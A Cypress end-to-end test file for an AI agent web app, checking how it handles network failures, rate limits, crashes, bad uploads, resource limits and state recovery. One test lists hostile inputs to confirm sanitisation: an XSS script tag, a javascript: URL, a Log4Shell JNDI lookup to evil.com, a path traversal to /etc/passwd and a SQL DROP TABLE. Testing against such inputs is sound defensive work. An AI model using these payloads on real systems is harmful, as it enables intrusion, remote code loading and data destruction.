/// <reference types="cypress" />

describe('Error Handling and Recovery Testing', () => {
  beforeEach(() => {
    // Skip boot sequence for error testing
    cy.window().then((win) => {
      win.localStorage.setItem('skipBoot', 'true');
    });
    cy.visit('/', { timeout: 15000 });

    // Wait for main interface to load
    cy.get('[data-testid="game-interface"]', { timeout: 20000 }).should('be.visible');
  });

  describe('Network and Connection Errors', () => {
    it('should handle API connection failures gracefully', () => {
      // Intercept API calls and simulate failure
      cy.intercept('POST', '/api/chat', { forceNetworkError: true }).as('chatError');
      cy.intercept('GET', '/api/health', { forceNetworkError: true }).as('healthError');

      // Attempt to send a message during network failure
      cy.get('[data-testid="chat-input"]').type('Test message during network failure{enter}');

      // Should show connection error
      cy.get('[data-testid="connection-error"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="error-message"]').should('contain', 'connection');
      cy.get('[data-testid="retry-connection-button"]').should('be.visible');
      cy.screenshot('error-network-failure');

      // Test retry mechanism
      cy.intercept('POST', '/api/chat', { statusCode: 200, body: { message: 'Connection restored' } });
      cy.get('[data-testid="retry-connection-button"]').click();

      // Should show connection restored
      cy.get('[data-testid="connection-restored"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="connection-status"]').should('contain', 'Connected');
      cy.screenshot('error-network-recovery');
    });

    it('should handle intermittent connectivity issues', () => {
      let callCount = 0;

      // Simulate intermittent failures
      cy.intercept('POST', '/api/chat', (req) => {
        callCount++;
        if (callCount % 3 === 0) {
          req.reply({ forceNetworkError: true });
        } else {
          req.reply({ statusCode: 200, body: { message: 'Success' } });
        }
      }).as('intermittentAPI');

      // Send multiple messages to trigger intermittent failures
      for (let i = 0; i < 5; i++) {
        cy.get('[data-testid="chat-input"]').type(`Message ${i + 1}{enter}`);
        cy.wait(2000);

        if ((i + 1) % 3 === 0) {
          // Should show error but then recover
          cy.get('[data-testid="message-failed-indicator"]').should('be.visible');
          cy.get('[data-testid="auto-retry-indicator"]').should('be.visible');
        }
      }

      // Should show successful recovery pattern
      cy.get('[data-testid="connection-stable-indicator"]').should('be.visible');
      cy.screenshot('error-intermittent-recovery');
    });

    it('should handle API rate limiting', () => {
      // Simulate rate limit error
      cy.intercept('POST', '/api/chat', {
        statusCode: 429,
        body: { error: 'Rate limit exceeded', retryAfter: 30 }
      }).as('rateLimitError');

      cy.get('[data-testid="chat-input"]').type('Test rate limiting{enter}');

      // Should show rate limit message
      cy.get('[data-testid="rate-limit-error"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="rate-limit-message"]').should('contain', 'too many requests');
      cy.get('[data-testid="rate-limit-countdown"]').should('be.visible');
      cy.screenshot('error-rate-limit');

      // Should show countdown timer
      cy.get('[data-testid="retry-timer"]').should('contain', '30');

      // Fast-forward time and verify auto-retry
      cy.clock();
      cy.tick(31000); // Fast forward 31 seconds

      // Should automatically retry
      cy.get('[data-testid="auto-retry-message"]').should('be.visible');
    });
  });

  describe('Backend Service Failures', () => {
    it('should handle agent runtime crashes', () => {
      // Simulate runtime crash
      cy.intercept('GET', '/api/status', {
        statusCode: 500,
        body: { error: 'Agent runtime crashed' }
      }).as('runtimeCrash');

      // Trigger status check
      cy.get('[data-testid="agent-status-refresh"]').click();

      // Should show runtime error
      cy.get('[data-testid="runtime-error"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="runtime-crash-message"]').should('contain', 'runtime crashed');
      cy.get('[data-testid="restart-runtime-button"]').should('be.visible');
      cy.screenshot('error-runtime-crash');

      // Test runtime restart
      cy.intercept('POST', '/api/restart', { statusCode: 200, body: { status: 'restarting' } });
      cy.intercept('GET', '/api/status', { statusCode: 200, body: { status: 'ready' } });

      cy.get('[data-testid="restart-runtime-button"]').click();
      cy.get('[data-testid="runtime-restarting"]').should('be.visible');

      // Should show recovery
      cy.get('[data-testid="runtime-recovered"]', { timeout: 15000 }).should('be.visible');
      cy.screenshot('error-runtime-recovery');
    });

    it('should handle database connection failures', () => {
      // Simulate database error
      cy.intercept('GET', '/api/memories', {
        statusCode: 503,
        body: { error: 'Database connection failed' }
      }).as('dbError');

      // Try to access memories
      cy.get('[data-testid="goals-tab"]').click();

      // Should show database error
      cy.get('[data-testid="database-error"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="db-error-message"]').should('contain', 'database');
      cy.get('[data-testid="offline-mode-button"]').should('be.visible');
      cy.screenshot('error-database-failure');

      // Test fallback to offline mode
      cy.get('[data-testid="offline-mode-button"]').click();
      cy.get('[data-testid="offline-mode-active"]').should('be.visible');
      cy.get('[data-testid="offline-warning"]').should('contain', 'limited functionality');
    });

    it('should handle model provider errors', () => {
      // Simulate model provider error
      cy.intercept('POST', '/api/chat', {
        statusCode: 400,
        body: { error: 'Model provider error: Invalid API key' }
      }).as('modelError');

      cy.get('[data-testid="chat-input"]').type('Test model error{enter}');

      // Should show model provider error
      cy.get('[data-testid="model-error"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="model-error-message"]').should('contain', 'API key');
      cy.get('[data-testid="check-api-settings"]').should('be.visible');
      cy.screenshot('error-model-provider');

      // Test navigation to settings
      cy.get('[data-testid="check-api-settings"]').click();
      cy.get('[data-testid="api-settings-modal"]').should('be.visible');
      cy.get('[data-testid="api-key-field"]').should('be.focused');
    });
  });

  describe('User Input and Validation Errors', () => {
    it('should handle invalid file uploads', () => {
      cy.get('[data-testid="files-tab"]').click();

      // Test oversized file
      const largeFile = new File(['x'.repeat(100 * 1024 * 1024)], 'large.txt', { type: 'text/plain' });

      cy.get('[data-testid="file-input"]').then(input => {
        const dataTransfer = new DataTransfer();
        dataTransfer.items.add(largeFile);
        input[0].files = dataTransfer.files;
        input[0].dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Should show file size error
      cy.get('[data-testid="file-size-error"]', { timeout: 5000 }).should('be.visible');
      cy.get('[data-testid="error-message"]').should('contain', 'too large');
      cy.screenshot('error-file-too-large');

      // Test invalid file type
      const invalidFile = new File(['test'], 'test.exe', { type: 'application/octet-stream' });

      cy.get('[data-testid="file-input"]').then(input => {
        const dataTransfer = new DataTransfer();
        dataTransfer.items.add(invalidFile);
        input[0].files = dataTransfer.files;
        input[0].dispatchEvent(new Event('change', { bubbles: true }));
      });

      // Should show file type error
      cy.get('[data-testid="file-type-error"]', { timeout: 5000 }).should('be.visible');
      cy.get('[data-testid="error-message"]').should('contain', 'file type not supported');
    });

    it('should handle malformed or dangerous input', () => {
      const dangerousInputs = [
        '<script>alert("xss")</script>',
        'javascript:alert("xss")',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        'DROP TABLE users;'
      ];

      dangerousInputs.forEach((input, index) => {
        cy.get('[data-testid="chat-input"]').clear().type(`${input}{enter}`);

        // Should sanitize or block dangerous input
        cy.get('[data-testid="input-sanitized"]').should('be.visible');
        cy.get('[data-testid="security-warning"]').should('contain', 'potentially unsafe');

        if (index === 2) {
          cy.screenshot('error-dangerous-input-blocked');
        }

        cy.wait(1000);
      });
    });

    it('should handle extremely long messages', () => {
      // Test very long message
      const longMessage = 'A'.repeat(10000);

      cy.get('[data-testid="chat-input"]').type(longMessage);

      // Should show length warning
      cy.get('[data-testid="message-length-warning"]').should('be.visible');
      cy.get('[data-testid="character-count"]').should('contain', '10000');
      cy.screenshot('error-message-too-long');

      // Should prevent submission or truncate
      cy.get('[data-testid="chat-send-button"]').should('be.disabled');
      // OR should show truncation option
      cy.get('[data-testid="truncate-message-button"]').then(($button) => {
        if ($button.length) {
          cy.wrap($button).click();
          cy.get('[data-testid="message-truncated"]').should('be.visible');
        }
      });
    });
  });

  describe('Resource and Performance Errors', () => {
    it('should handle memory pressure gracefully', () => {
      // Simulate low memory condition
      cy.window().then((win) => {
        // Mock performance.memory if available
        if (win.performance && win.performance.memory) {
          Object.defineProperty(win.performance.memory, 'usedJSHeapSize', {
            value: 900 * 1024 * 1024, // 900MB
            writable: false
          });
          Object.defineProperty(win.performance.memory, 'totalJSHeapSize', {
            value: 1024 * 1024 * 1024, // 1GB
            writable: false
          });
        }
      });

      // Trigger memory-intensive operation
      cy.get('[data-testid="chat-input"]').type('Generate a very long detailed response{enter}');

      // Should show memory warning
      cy.get('[data-testid="memory-warning"]', { timeout: 15000 }).should('be.visible');
      cy.get('[data-testid="memory-usage-indicator"]').should('contain', 'High');
      cy.get('[data-testid="clear-cache-suggestion"]').should('be.visible');
      cy.screenshot('error-high-memory-usage');

      // Test cache clearing
      cy.get('[data-testid="clear-cache-button"]').click();
      cy.get('[data-testid="cache-cleared-confirmation"]').should('be.visible');
    });

    it('should handle CPU intensive operations', () => {
      // Enable multiple resource-heavy capabilities
      cy.get('[data-testid="config-tab"]').click();

      ['browser-toggle', 'camera-toggle', 'coding-toggle', 'shell-toggle'].forEach(toggle => {
        cy.get(`[data-testid="${toggle}"]`).click();
      });

      // Request CPU-intensive operation
      cy.get('[data-testid="chat-input"]').type('Simultaneously browse the web, analyze my screen, write some code, and run shell commands{enter}');

      // Should show performance warning
      cy.get('[data-testid="performance-warning"]', { timeout: 20000 }).should('be.visible');
      cy.get('[data-testid="cpu-usage-high"]').should('be.visible');
      cy.get('[data-testid="throttle-operations-suggestion"]').should('be.visible');
      cy.screenshot('error-high-cpu-usage');

      // Test operation throttling
      cy.get('[data-testid="enable-throttling-button"]').click();
      cy.get('[data-testid="throttling-active"]').should('be.visible');
      cy.get('[data-testid="operation-queue"]').should('be.visible');
    });

    it('should handle storage quota exceeded', () => {
      // Mock storage quota exceeded
      cy.window().then((win) => {
        const originalSetItem = win.localStorage.setItem;
        win.localStorage.setItem = () => {
          throw new DOMException('QuotaExceededError');
        };
      });

      // Try to create many goals/todos to fill storage
      cy.get('[data-testid="chat-input"]').type('Create 100 different goals for me{enter}');

      // Should show storage quota error
      cy.get('[data-testid="storage-quota-error"]', { timeout: 15000 }).should('be.visible');
      cy.get('[data-testid="storage-full-message"]').should('contain', 'storage full');
      cy.get('[data-testid="cleanup-storage-button"]').should('be.visible');
      cy.screenshot('error-storage-quota-exceeded');

      // Test storage cleanup
      cy.get('[data-testid="cleanup-storage-button"]').click();
      cy.get('[data-testid="storage-cleanup-dialog"]').should('be.visible');
      cy.get('[data-testid="confirm-cleanup-button"]').click();
      cy.get('[data-testid="storage-cleaned-confirmation"]').should('be.visible');
    });
  });

  describe('Recovery and State Restoration', () => {
    it('should recover from page crashes and maintain state', () => {
      // Create some state
      cy.get('[data-testid="chat-input"]').type('Remember that I am working on a Python project{enter}');
      cy.get('[data-testid="agent-message"]', { timeout: 15000 }).should('be.visible');

      cy.get('[data-testid="goals-tab"]').click();
      cy.get('[data-testid="chat-input"]').type('Create a goal to learn advanced Python{enter}');
      cy.get('[data-testid="agent-message"]', { timeout: 15000 }).should('be.visible');

      // Simulate page crash and recovery
      cy.window().then((win) => {
        win.location.reload();
      });

      // Wait for recovery
      cy.get('[data-testid="game-interface"]', { timeout: 20000 }).should('be.visible');
      cy.get('[data-testid="state-recovery-indicator"]').should('be.visible');
      cy.screenshot('error-state-recovery');

      // Verify state was recovered
      cy.get('[data-testid="goals-tab"]').click();
      cy.get('[data-testid="goal-item"]').should('contain', 'Python');

      cy.get('[data-testid="chat-input"]').type('What do you remember about my project?{enter}');
      cy.get('[data-testid="agent-message"]', { timeout: 15000 }).should('contain', 'Python');
    });

    it('should handle corrupted local storage gracefully', () => {
      // Corrupt local storage
      cy.window().then((win) => {
        win.localStorage.setItem('appState', 'corrupted-invalid-json{');
        win.localStorage.setItem('chatHistory', '[invalid json');
      });

      // Reload page
      cy.reload();

      // Should detect corruption and reset gracefully
      cy.get('[data-testid="storage-corruption-detected"]', { timeout: 15000 }).should('be.visible');
      cy.get('[data-testid="reset-storage-button"]').should('be.visible');
      cy.screenshot('error-corrupted-storage');

      // Test storage reset
      cy.get('[data-testid="reset-storage-button"]').click();
      cy.get('[data-testid="storage-reset-confirmation"]').should('be.visible');
      cy.get('[data-testid="confirm-storage-reset"]').click();

      // Should start fresh
      cy.get('[data-testid="fresh-start-message"]').should('be.visible');
      cy.get('[data-testid="game-interface"]').should('be.visible');
    });

    it('should recover from partial operation failures', () => {
      // Start a complex multi-step operation
      cy.get('[data-testid="chat-input"]').type('Create a comprehensive learning plan with goals, todos, and schedule{enter}');

      // Simulate partial failure during operation
      cy.intercept('POST', '/api/todos', { forceNetworkError: true }).as('todoError');

      cy.get('[data-testid="agent-message"]', { timeout: 15000 }).should('be.visible');

      // Should show partial failure
      cy.get('[data-testid="partial-operation-failure"]').should('be.visible');
      cy.get('[data-testid="completed-steps"]').should('contain', 'goals created');
      cy.get('[data-testid="failed-steps"]').should('contain', 'todos failed');
      cy.get('[data-testid="retry-failed-steps"]').should('be.visible');
      cy.screenshot('error-partial-failure');

      // Test retry of failed steps
      cy.intercept('POST', '/api/todos', { statusCode: 200, body: { success: true } });
      cy.get('[data-testid="retry-failed-steps"]').click();

      cy.get('[data-testid="operation-completed"]', { timeout: 15000 }).should('be.visible');
    });
  });

  describe('Error Reporting and Diagnostics', () => {
    it('should collect and display error diagnostics', () => {
      // Trigger an error condition
      cy.intercept('POST', '/api/chat', {
        statusCode: 500,
        body: { error: 'Internal server error', trace: 'Mock error trace' }
      });

      cy.get('[data-testid="chat-input"]').type('Trigger error for diagnostics{enter}');

      // Should show error with diagnostics option
      cy.get('[data-testid="error-occurred"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="show-diagnostics-button"]').should('be.visible');
      cy.screenshot('error-with-diagnostics');

      // Test diagnostics panel
      cy.get('[data-testid="show-diagnostics-button"]').click();
      cy.get('[data-testid="diagnostics-panel"]').should('be.visible');
      cy.get('[data-testid="error-details"]').should('contain', 'Internal server error');
      cy.get('[data-testid="system-info"]').should('be.visible');
      cy.get('[data-testid="browser-info"]').should('be.visible');
      cy.get('[data-testid="session-info"]').should('be.visible');

      // Test error reporting
      cy.get('[data-testid="send-error-report-button"]').should('be.visible');
      cy.get('[data-testid="error-description-input"]').type('Test error report');
      cy.get('[data-testid="send-error-report-button"]').click();
      cy.get('[data-testid="error-report-sent"]').should('be.visible');
    });

    it('should provide troubleshooting guidance', () => {
      // Simulate common error pattern
      cy.intercept('GET', '/api/health', { statusCode: 404 }).as('notFound');

      cy.get('[data-testid="agent-status-refresh"]').click();

      // Should provide contextual troubleshooting
      cy.get('[data-testid="troubleshooting-panel"]', { timeout: 10000 }).should('be.visible');
      cy.get('[data-testid="suggested-solutions"]').should('be.visible');
      cy.get('[data-testid="solution-step"]').should('exist');
      cy.screenshot('error-troubleshooting-guidance');

      // Test guided troubleshooting
      cy.get('[data-testid="solution-step"]').first().click();
      cy.get('[data-testid="step-instructions"]').should('be.visible');
      cy.get('[data-testid="test-solution-button"]').should('be.visible');
    });
  });

  afterEach(() => {
    // Clean up any error states
    cy.window().then((win) => {
      // Reset any mocked functions
      if (win.localStorage.setItem !== Storage.prototype.setItem) {
        win.localStorage.setItem = Storage.prototype.setItem;
      }
    });

    // Clear any error indicators
    cy.get('[data-testid="clear-all-errors"]').then(($button) => {
      if ($button.length) {
        cy.wrap($button).click();
      }
    });

    cy.screenshot('error-test-complete');
  });
});
